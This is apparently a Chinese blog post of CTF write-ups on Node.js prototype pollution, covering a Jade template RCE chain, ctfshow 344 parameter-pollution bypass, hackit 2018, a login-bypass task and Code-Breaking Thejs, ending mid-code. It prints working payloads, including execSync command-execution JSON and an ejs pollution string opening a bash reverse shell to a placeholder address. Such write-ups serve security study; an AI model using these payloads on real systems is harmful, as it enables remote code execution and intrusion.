<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;line&quot;</span>:<span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>监视node.line值</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126173326438.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126173359572.png" srcset="/img/loading.gif" lazyload></p>
<p>或者<code>Uncaught ReferenceError: node is not defined</code>，说明node.line存在原始的值，它不会去Object找污染的值</p>
<p>重新梳理一下调用栈</p>
<blockquote>
<p>res.render-&gt;app.render-&gt;tryRender-&gt;view.render-&gt;this.engine</p>
<ol>
<li>app.js :: res.render</li>
<li>jade/lib/index.js :: exports.__express</li>
<li>jade/lib/index.js :: exports.renderFile<ol>
<li>jade/lib/index.js :: handleTemplateCache</li>
</ol>
</li>
<li>jade/lib/index.js :: exports.compile<ol>
<li>jade/lib/index.js :: parse -&gt; compiler.compile();<ol>
<li>jade/lib/compiler.js :: Compiler.compile -&gt; this.visit(this.node)</li>
<li>jade/lib/compiler.js :: this.visit</li>
<li>jade/lib/compiler.js :: this.buf.push</li>
</ol>
</li>
<li>jade/lib/index.js :: parse -&gt; options.self</li>
<li>jade/lib/index.js :: fn = new Function(‘locals, jade’, fn)</li>
<li>jade/lib/index.js :: fn(locals, Object.create(runtime))</li>
</ol>
</li>
</ol>
</blockquote>
<p>进入app.render后可以看到获取了options，触发app渲染引擎进行渲染</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125170700643.png" srcset="/img/loading.gif" lazyload></p>
<p>系列参数设置继续步过，进入tryRender</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125173138254.png" srcset="/img/loading.gif" lazyload></p>
<p>可以看到，寻找到app的渲染引擎，并且设置为jade，开始渲染</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125173338485.png" srcset="/img/loading.gif" lazyload></p>
<p>this.engine进入jade库</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125173430135.png" srcset="/img/loading.gif" lazyload></p>
<p>回到node.line打一下看看</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126174150498.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>TypeError: this[(“visit” + node.type)] is not a function</p>
</blockquote>
<p>找到Compiler.visitNode，打个断点</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126174434191.png" srcset="/img/loading.gif" lazyload></p>
<p>拼接发现没有这个方法，遍历ast树，通常是通过“visit+节点类型”来遍历所有节点的，观察光标，按照他的默认值设置为Block</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126183747677.png" srcset="/img/loading.gif" lazyload></p>
<p>节点类型不合要求，测试所有节点类型如下：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">visitAttributes</span><br>visitEach<br>visitCode √<br>visitBlockComment√<br>visitComment√<br>visitText<br>visitFilter<br>visitTag<br>visitMixin<br>visitDoctype√<br>visitMixinBlock√<br>visitBlock<br>visitLiteral<br>visitWhen<br>visitCase<br>visitNode<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126184235129.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>TypeError: plugin is not a function</p>
</blockquote>
<p>看报错还没有完成渲染，找到jade渲染完前的最后报错</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126212401866.png" srcset="/img/loading.gif" lazyload></p>
<p>是一个判断，打进去的时候self是undefined，可以污染</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126231450129.png" srcset="/img/loading.gif" lazyload></p>
<p>污染title</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126231900595.png" srcset="/img/loading.gif" lazyload></p>
<p>污染message</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126232004589.png" srcset="/img/loading.gif" lazyload></p>
<p>污染error，一开始传了一个1，传json格式的内容</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">,<span class="hljs-string">&quot;error&quot;</span>:&#123;<span class="hljs-attr">&quot;status&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">&quot;stack&quot;</span>:<span class="hljs-string">&quot;runing&quot;</span>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>补充，其实污染目标就是node.line，一开始就污染node.line就可以知道只污染哪些属性即可，因为有些属性不配置的话，它要么有默认值，要么就是能部分渲染没完成，不影响我们的污染数据的执行</p>
<p>对于普通模板，只需要污染self和line，有继承的模板需要污染type</p>
<p>当有顶格h=title类型的需要污染block类型</p>
<p>jade入口：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">exports</span>.__express = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">path, options, fn</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(options.compileDebug == <span class="hljs-literal">undefined</span> &amp;&amp; process.env.NODE_ENV === <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>    options.compileDebug = <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-built_in">exports</span>.renderFile(path, options, fn);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>options.compileDebug</code> 无初始值，可以覆盖开启 Debug 模式，当然也有另外一种情况，部署时，没有正确配置 <code>req.app.get(&#39;env&#39;)</code> 导致 debug 模式开启，那么这个变量也可以不用覆盖，但为了确保通用性，这里还是覆盖一下，防止正确配置</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;compileDebug&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">&quot;line&quot;</span>:<span class="hljs-number">1</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>另外<strong>this.debug</strong>哪里来？？</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> Compiler = <span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Compiler</span>(<span class="hljs-params">node, options</span>) </span>&#123;<br>  <span class="hljs-built_in">this</span>.debug = <span class="hljs-literal">false</span> !== options.compileDebug;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br></code></pre></td></tr></table></figure>
</blockquote>
<p>最终Exp：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<br><span class="hljs-attr">&quot;line&quot;</span>:<span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span>,<br><span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;Code&quot;</span>,<br><span class="hljs-attr">&quot;self&quot;</span>:<span class="hljs-number">1</span><br>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>来个全家福</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211127000013927.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="ctfshow-344"><a href="#ctfshow-344" class="headerlink" title="ctfshow 344"></a>ctfshow 344</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">if</span>(req.url.match(<span class="hljs-regexp">/8c|2c|\,/ig</span>))&#123;<br>  	res.end(<span class="hljs-string">&#x27;where is flag :)&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">var</span> query = <span class="hljs-built_in">JSON</span>.parse(req.query.query);<br>  <span class="hljs-keyword">if</span>(query.name===<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp;query.password===<span class="hljs-string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.isVIP===<span class="hljs-literal">true</span>)&#123;<br>  	res.end(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  	res.end(<span class="hljs-string">&#x27;where is flag. :)&#x27;</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure>

<p>不能有8c、2c、逗号</p>
<p>正常请求：</p>
<blockquote>
<p>?query={“name”:”admin”,”password”:”ctfshow”,”isVIP”:true}</p>
</blockquote>
<p>这里介绍一下HPP数据污染</p>
<blockquote>
<p>Web服务器 　　　　　　 参数获取函数 　　　　　　　　　　   获取到的参数</p>
<p>PHP/Apache　　 　　  $_GET(“par”) 　　　　　　　　　　 Last</p>
<p>JSP/Tomcat 　　　　  Request.getParameter(“par”)    First</p>
<p>Perl(CGI)/Apache 　 Param(“par”) 　　　　　　　　　　 First</p>
<p>Python/Apache 　　  getvalue(“par”) 　　　　　　　　  All(List)</p>
<p>ASP/IIS 　　　　　　 Request.QueryString(“par”) 　　 All (comma-delimited string)</p>
</blockquote>
<p>而nodejs就是会将同名参数以数组进行存储，json.parse也能正常解析</p>
<blockquote>
<p>?query={“name”:”admin”&amp;query=”password”:”ctfshow”&amp;query=”isVIP”:true}</p>
</blockquote>
<p>逗号已经绕过，url编码看一下</p>
<blockquote>
<p>%3Fquery%3D%7B%22name%22%3A%22admin%22%26query%3D%22password%22%3A%22ctfshow%22%26query%3D%22isVIP%22%3Atrue%7D</p>
</blockquote>
<p>ctfshow前面出现了一个%22，是双引号，和c成了2c，c得绕一下，进行unicode编码一下%63</p>
<p>payload：</p>
<blockquote>
<p>?query={“name”:”admin”&amp;query=”password”:”%63tfshow”&amp;query=”isVIP”:true}</p>
</blockquote>
<h4 id="hackit-2018"><a href="#hackit-2018" class="headerlink" title="hackit 2018"></a>hackit 2018</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&#x27;use strict&#x27;</span>;<br> <br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br> <br><span class="hljs-keyword">const</span> isObject = <span class="hljs-function"><span class="hljs-params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="hljs-built_in">Object</span>;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">merge</span>(<span class="hljs-params">a, b</span>) </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;<br>        <span class="hljs-keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;<br>            merge(a[attr], b[attr]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            a[attr] = b[attr];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> a<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clone</span>(<span class="hljs-params">a</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> merge(&#123;&#125;, a);<br>&#125;<br> <br><span class="hljs-comment">// Constants</span><br><span class="hljs-keyword">const</span> PORT = <span class="hljs-number">8080</span>;<br><span class="hljs-keyword">const</span> HOST = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>;<br><span class="hljs-keyword">const</span> admin = &#123;&#125;;<br> <br><span class="hljs-comment">// App</span><br><span class="hljs-keyword">const</span> app = express();<br>app.use(bodyParser.json())<br>app.use(cookieParser());<br> <br>app.use(<span class="hljs-string">&#x27;/&#x27;</span>, express.static(path.join(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>)));<br>app.post(<span class="hljs-string">&#x27;/signup&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">var</span> body = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.body));<br>    <span class="hljs-keyword">var</span> copybody = clone(body)<br>    <span class="hljs-keyword">if</span> (copybody.name) &#123;<br>        res.cookie(<span class="hljs-string">&#x27;name&#x27;</span>, copybody.name).json(&#123;<br>            <span class="hljs-string">&quot;done&quot;</span>: <span class="hljs-string">&quot;cookie set&quot;</span><br>        &#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.json(&#123;<br>            <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;cookie not set&quot;</span><br>        &#125;)<br>    &#125;<br>&#125;);<br>app.get(<span class="hljs-string">&#x27;/getFlag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">var</span> аdmin = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.cookies))<br>    <span class="hljs-keyword">if</span> (admin.аdmin == <span class="hljs-number">1</span>) &#123;<br>        res.send(<span class="hljs-string">&quot;hackim19&#123;&#125;&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.send(<span class="hljs-string">&quot;You are not authorized&quot;</span>);<br>    &#125;<br>&#125;);<br>app.listen(PORT, HOST);<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Running on http://<span class="hljs-subst">$&#123;HOST&#125;</span>:<span class="hljs-subst">$&#123;PORT&#125;</span>`</span>);<br></code></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -vv --header &#x27;Content-type: application/json&#x27; -d &#x27;&#123;&quot;__proto__&quot;: &#123;&quot;admin&quot;: 1&#125;&#125;&#x27; &#x27;http://0.0.0.0:4000/signup&#x27;; <br><br>curl -vv &#x27;http://0.0.0.0:4000/getFlag&#x27;<br></code></pre></td></tr></table></figure>
<p>首先请求 /signup 接口，在 NodeJS 服务中，我们调用了有漏洞的 merge 方法，并通过 __proto__ 为 Object.prototype（因为 {}.__proto__ === Object.prototype） 添加上一个新的属性 admin，且值为 1。</p>
<p>再次请求 getFlag 接口，条件语句 admin.аdmin == 1 为 true，服务被攻击。</p>
<p>攻击案例出自：Prototype pollution attacks in NodeJS applications</p>
<p>这样的漏洞在 jQuery $.extend 中也经常见到<br>对于 jQuery：如果担心安全问题，建议升级至最新版本 jQuery 3.4.0，如果还在使用 jQuery 的 1.x 和 2.x 版本，那么你的应用程序和网站仍有可能遭受攻击。</p>
<h4 id="登录绕过题"><a href="#登录绕过题" class="headerlink" title="登录绕过题"></a>登录绕过题</h4><p>{“user”:[0],”passwd”:[0]}</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/%E8%AE%BF%E9%97%AE%E5%90%8E%E7%AB%AFjs%E6%96%87%E4%BB%B6.png" srcset="/img/loading.gif" lazyload></p>
<p>这题可以控制host参数去篡改mysql的连接地址 利用mysql客户端任意文件读取 <a target="_blank" rel="noopener" href="https://blog.csdn.net/ls1120704214/article/details/88174003">https://blog.csdn.net/ls1120704214/article/details/88174003</a></p>
<p>但是如果直接在json中传递{“host”:””},根本不会有任何效果<br>在57行<br><code>if (body.host != undefined) &#123;</code><br>如果发现有直接传递进来的host参数，nodejs就报错退出，所以，通过仔细观察源代码，发现这个代码有参数污染问题，所以就可以通过构造如下参数去改变host参数，把host参数变成我们自己mysql服务器的地址<br>原题作者博客<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6991">https://xz.aliyun.com/t/6991</a></p>
<p>不用host参数篡改mysql地址 还可以利用原型链污染：<br><code>&#123;&quot;user&quot;:&quot;test&quot;,&quot;passwd&quot;:&quot;test&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xx/6666 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></p>
<h4 id="Code-Breaking-Thejs"><a href="#Code-Breaking-Thejs" class="headerlink" title="Code-Breaking Thejs"></a>Code-Breaking Thejs</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>)<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><span class="hljs-keyword">const</span> randomize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;randomatic&#x27;</span>)<br><span class="hljs-keyword">const</span> app = express()<br>app.use(bodyParser.urlencoded(&#123;<span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span>&#125;)).use(bodyParser.json()) <span class="hljs-comment">//处理JSON数据</span><br>app.use(<span class="hljs-string">&#x27;/static&#x27;</span>, express.static(<span class="hljs-string">&#x27;static&#x27;</span>))<br>app.use(session(&#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;thejs.session&#x27;</span>,<br>    <span class="hljs-attr">secret</span>: randomize(<span class="hljs-string">&#x27;aA0&#x27;</span>, <span class="hljs-number">16</span>),<br>    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>     <span class="hljs-comment">//设置一下Session</span><br>&#125;))<br>app.engine(<span class="hljs-string">&#x27;ejs&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) </span>&#123; <span class="hljs-comment">// define the template engine</span><br>    fs.readFile(filePath, <span class="hljs-function">(<span class="hljs-params">err, content</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> callback(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(err)) <span class="hljs-comment">//调用ejs进行渲染</span><br>        <span class="hljs-keyword">let</span> compiled = lodash.template(content) <span class="hljs-comment">//渲染内容</span><br>        <span class="hljs-keyword">let</span> rendered = compiled(&#123;...options&#125;) <span class="hljs-comment">//动态引入成员变量</span><br>    <span class="hljs-keyword">return</span> callback(<span class="hljs-literal">null</span>, rendered) <span class="hljs-comment">//传回来</span><br>&#125;)<br>&#125;)<br>app.set(<span class="hljs-string">&#x27;views&#x27;</span>, <span class="hljs-string">&#x27;./views&#x27;</span>)<br>app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>)<br>app.all(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> data = req.session.data || &#123;<span class="hljs-attr">language</span>: [], <span class="hljs-attr">category</span>: []&#125;<br>    <span class="hljs-keyword">if</span> (req.method == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>        data = lodash.merge(data, req.body)<br>        req.session.data = data<br>    &#125;    <span class="hljs-comment">//将body中的数据传入sessioN中</span><br>res.render(<span class="hljs-string">&#x27;index&#x27;</span>, &#123;<br>    <span class="hljs-attr">language</span>: data.language, <br>    <span class="hljs-attr">category</span>: data.category <span class="hljs-comment">//渲染自己的选择</span><br>&#125;)<br>&#125;)<br>app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">console</span>.log(Example app listening on port <span class="hljs-number">3000</span>!))<br></code></pre></td></tr></table></figure>


<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">var</span> hbs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;hbs&#x27;</span>);<br><span class="hljs-keyword">var</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> md5 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;md5&#x27;</span>);<br><span class="hljs-keyword">var</span> morganBody = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan-body&#x27;</span>);<br><span class="hljs-keyword">const</span> app = express();<br><span class="hljs-keyword">var</span> user = []; <span class="hljs-comment">//empty for now</span><br><span class="hljs-keyword">var</span> matrix = [];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)&#123;<br>    matrix[i] = [<span class="hljs-literal">null</span> , <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>];<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">draw</span>(<span class="hljs-params">mat</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span> (matrix[i][j] !== <span class="hljs-literal">null</span>)&#123;<br>                count += <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> count === <span class="hljs-number">9</span>;<br>&#125;<br>app.use(express.static(<span class="hljs-string">&#x27;public&#x27;</span>));<br>app.use(bodyParser.json());<br>app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>);<br>morganBody(app);<br>app.engine(<span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;hbs&#x27;</span>).__express);<br><br>app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)&#123;<br>        matrix[i] = [<span class="hljs-literal">null</span> , <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>];<br><br>    &#125;<br>    res.render(<span class="hljs-string">&#x27;index&#x27;</span>);<br>&#125;)<br>app.get(<span class="hljs-string">&#x27;/admin&#x27;</span>, <span class="hljs-function">(<span 